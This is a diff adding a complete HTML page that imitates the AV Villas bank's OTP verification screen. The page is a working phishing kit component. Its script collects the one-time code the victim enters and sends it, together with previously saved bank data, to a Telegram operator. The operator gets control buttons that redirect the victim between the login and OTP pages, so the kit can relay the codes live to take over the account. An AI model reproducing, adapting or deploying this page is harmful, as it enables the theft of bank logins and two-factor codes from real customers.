@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AV Villas - Verificación OTP</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 30px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 180px;
+            height: auto;
+            max-width: 100%;
+        }
+
+        h1 {
+            font-size: 18px;
+            font-weight: 400;
+            color: #333;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group.error input {
+            border-color: #e31e24;
+        }
+
+        .error-message {
+            color: #e31e24;
+            font-size: 11px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .form-group.error .error-message {
+            display: block;
+        }
+
+        .error-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: none;
+            pointer-events: none;
+        }
+
+        .form-group.error .error-icon {
+            display: block;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            color: #0066cc;
+            margin-bottom: 5px;
+            font-weight: 400;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 45px 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: 'Roboto', sans-serif;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.3s;
+            letter-spacing: 2px;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #0066cc;
+        }
+
+        input::placeholder {
+            color: #999;
+            letter-spacing: normal;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+        }
+
+        .input-icon.visible {
+            opacity: 1;
+        }
+
+        .input-icon svg {
+            width: 20px;
+            height: 20px;
+            fill: #666;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #d4d4d4;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 500;
+            text-transform: uppercase;
+            cursor: not-allowed;
+            margin-top: 20px;
+            transition: all 0.3s;
+            letter-spacing: 0.5px;
+        }
+
+        .submit-btn.enabled {
+            background: linear-gradient(135deg, #0033cc 0%, #0066ff 100%);
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 51, 204, 0.3);
+        }
+
+        .submit-btn.enabled:hover {
+            background: linear-gradient(135deg, #002299 0%, #0052cc 100%);
+            box-shadow: 0 6px 16px rgba(0, 51, 204, 0.4);
+        }
+
+        .help-links {
+            text-align: center;
+            margin-top: 25px;
+        }
+
+        .help-links a {
+            color: #0066cc;
+            font-size: 13px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .back-link a {
+            color: #0066cc;
+            font-size: 13px;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .back-link a:hover {
+            text-decoration: underline;
+        }
+
+        .suggestion-tab {
+            position: fixed;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #e31e24;
+            color: white;
+            padding: 40px 15px;
+            border-radius: 8px 0 0 8px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            z-index: 1000;
+            box-shadow: -2px 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .suggestion-tab span {
+            writing-mode: vertical-rl;
+            transform: rotate(180deg);
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 1px;
+        }
+
+        .suggestion-icon {
+            width: 30px;
+            height: 30px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #e31e24;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #f5f5f5 0%, #ffffff 100%);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .loading-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-logo {
+            width: 200px;
+            margin-bottom: 40px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .loading-logo img {
+            width: 100%;
+            height: auto;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+        }
+
+        .spinner-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 30px;
+        }
+
+        .spinner {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            border: 4px solid #e8e8e8;
+            border-top: 4px solid #e31e24;
+            border-right: 4px solid #0066cc;
+            border-radius: 50%;
+            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        .spinner-inner {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 60px;
+            height: 60px;
+            border: 3px solid #f5f5f5;
+            border-bottom: 3px solid #0066cc;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite reverse;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #333;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            animation: fadeInOut 1.5s ease-in-out infinite;
+        }
+
+        .loading-subtext {
+            color: #666;
+            font-size: 14px;
+            font-weight: 300;
+        }
+
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .loading-dots {
+            display: inline-flex;
+            gap: 5px;
+        }
+
+        .loading-dots span {
+            width: 8px;
+            height: 8px;
+            background-color: #0066cc;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out;
+        }
+
+        .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+
+        footer {
+            background-color: white;
+            padding: 15px 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .footer-logo-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .footer-logo-left img {
+            height: 28px;
+            width: auto;
+            max-width: 120px;
+        }
+
+        .footer-logo-right {
+            display: flex;
+            align-items: center;
+        }
+
+        .footer-logo-right img {
+            height: 25px;
+            width: auto;
+            max-width: 150px;
+        }
+
+        @media (max-width: 768px) {
+            .login-card {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 16px;
+            }
+
+            .footer-content {
+                padding: 0 10px;
+            }
+
+            .footer-logo-left img {
+                height: 24px;
+                max-width: 100px;
+            }
+
+            .footer-logo-right img {
+                height: 22px;
+                max-width: 120px;
+            }
+
+            .suggestion-tab {
+                padding: 30px 10px;
+            }
+
+            .suggestion-tab span {
+                font-size: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+
+            .login-card {
+                padding: 25px 15px;
+            }
+
+            .logo img {
+                width: 150px;
+            }
+
+            h1 {
+                font-size: 15px;
+                margin-bottom: 20px;
+            }
+
+            .footer-logo-left img {
+                height: 20px;
+                max-width: 80px;
+            }
+
+            .footer-logo-right img {
+                height: 18px;
+                max-width: 100px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-logo">
+                <img src="img/logo-avvillas.svg" alt="AV Villas">
+            </div>
+            <div class="spinner-container">
+                <div class="spinner"></div>
+                <div class="spinner-inner"></div>
+            </div>
+            <div class="loading-text">Verificando código</div>
+            <div class="loading-subtext">
+                Por favor espera
+                <span class="loading-dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </span>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <img src="img/logo-avvillas.svg" alt="AV Villas">
+            </div>
+            
+            <h1>Verificación de seguridad</h1>
+            <p class="subtitle">Ingresa el código que enviamos a tu celular o correo electrónico</p>
+            
+            <form id="otpForm">
+                <div class="form-group" id="otpGroup">
+                    <label for="otp-code">Código de verificación</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="otp-code" name="otp-code" maxlength="8">
+                        <div class="input-icon" id="codeIcon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="error-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="#e31e24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                    </div>
+                    <div class="error-message">Este campo es requerido</div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn" disabled>Verificar</button>
+            </form>
+
+            <div class="help-links">
+                <a href="#">¿No recibiste el código?</a>
+                <a href="#"><strong>Reenviar código</strong></a>
+            </div>
+
+            <div class="back-link">
+                <a href="index.html">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#0066cc">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                    </svg>
+                    Volver al inicio
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="suggestion-tab">
+        <div class="suggestion-icon">💬</div>
+        <span>Sugerencias</span>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-logo-left">
+                <img src="img/grupo-aval.png" alt="Grupo Aval">
+            </div>
+            <div class="footer-logo-right">
+                <img src="img/logo_vigilado_horizontal_black.svg" alt="Vigilado">
+            </div>
+        </div>
+    </footer>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const otpCode = document.getElementById('otp-code');
+        const btn = document.getElementById('submitBtn');
+        const form = document.getElementById('otpForm');
+        const overlay = document.getElementById('loadingOverlay');
+        
+        if (!otpCode || !btn || !form || !overlay) return;
+        
+        overlay.classList.remove('active', 'show');
+        overlay.style.display = '';
+        
+        const socketInstance = BancoUtils.initSocket();
+        if (socketInstance) {
+            socketInstance.removeAllListeners('telegramAction');
+        }
+        
+        btn.disabled = true;
+        btn.classList.remove('enabled');
+        
+        otpCode.addEventListener('input', function() {
+            const numericValue = otpCode.value.replace(/\D/g, '');
+            otpCode.value = numericValue;
+            
+            const isValid = numericValue.length >= 4;
+            btn.disabled = !isValid;
+            btn.classList.toggle('enabled', isValid);
+        });
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (btn.disabled) return;
+            
+            const currentSocket = BancoUtils.getSocket();
+            if (!currentSocket || !currentSocket.connected) {
+                BancoUtils.initSocket();
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            overlay.classList.add('active');
+            
+            const data = {
+                otp: otpCode.value.trim()
+            };
+            
+            const fullData = BancoUtils.saveBankData('av-villas', data);
+            const message = BancoUtils.formatMessage('AV VILLAS - OTP', fullData);
+            
+            const buttons = [
+                { text: '🔑 Pedir Login', action: 'login' },
+                { text: '📱 Pedir OTP', action: 'otp' },
+                { text: '✅ Finalizar', action: 'finalizar' }
+            ];
+            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+            
+            try {
+                await BancoUtils.sendToTelegram('otp', {
+                    text: message,
+                    keyboard: keyboard
+                });
+            } catch (error) {
+                overlay.classList.remove('active');
+                alert('Error al enviar la información. Por favor intente nuevamente.');
+            }
+        });
+        
+        BancoUtils.onTelegramAction((data) => {
+            if (data.action === 'login') {
+                window.location.href = 'index.html';
+            } else if (data.action === 'otp') {
+                window.location.href = 'otp.html';
+            } else if (data.action === 'finalizar') {
+                window.location.href = 'https://www.avvillas.com.co/';
+            }
+        });
+    });
+    </script>
+</body>
+</html>
